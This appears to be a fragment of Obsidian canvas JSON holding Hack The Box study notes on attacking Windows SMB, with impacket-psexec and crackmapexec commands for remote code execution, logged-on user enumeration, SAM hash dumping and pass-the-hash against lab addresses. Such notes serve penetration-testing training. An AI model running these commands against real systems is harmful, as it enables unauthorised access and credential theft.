		{"id":"5741d06bf965dffc","type":"text","text":"# RCE\n## Impacket\n```shell-session\nnchiato@htb[/htb]$ impacket-psexec administrator:'Password123!'@10.10.110.17\n```\n","x":1140,"y":165,"width":839,"height":249},
		{"id":"9d18e8a5d5c86d45","type":"text","text":"## CrackMap Exec\n```shell-session\nnchiato@htb[/htb]$ crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec\n```","x":1215,"y":574,"width":689,"height":181},
		{"id":"c53a709e13015740","type":"text","text":"Forced Authentication Attacks","x":1158,"y":1241,"width":402,"height":50},
		{"id":"19fbd79a3943540b","type":"text","text":"# Enum Users\n```shell-session\nnchiato@htb[/htb]$ crackmapexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users\n```","x":2350,"y":165,"width":720,"height":160},
		{"id":"ca88f4fa8ca862f3","type":"text","text":"# Extract SAM Hashes\n\n```shell-session\nnchiato@htb[/htb]$ crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam\n```","x":1998,"y":765,"width":432,"height":160},
		{"id":"66143154b32519b0","type":"text","text":"# PtH\n\n```shell-session\nnchiato@htb[/htb]$ crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE\n```","x":2561,"y":710,"width":749,"height":215},
		{"id":"254475e4717330cf","type":"text","text":"Windows SMB Options\n- RCE\n- Extract Hashes SAM\n- Enum Logged on users\n- PtH","x":1939,"y":-195,"width":304,"height":175},
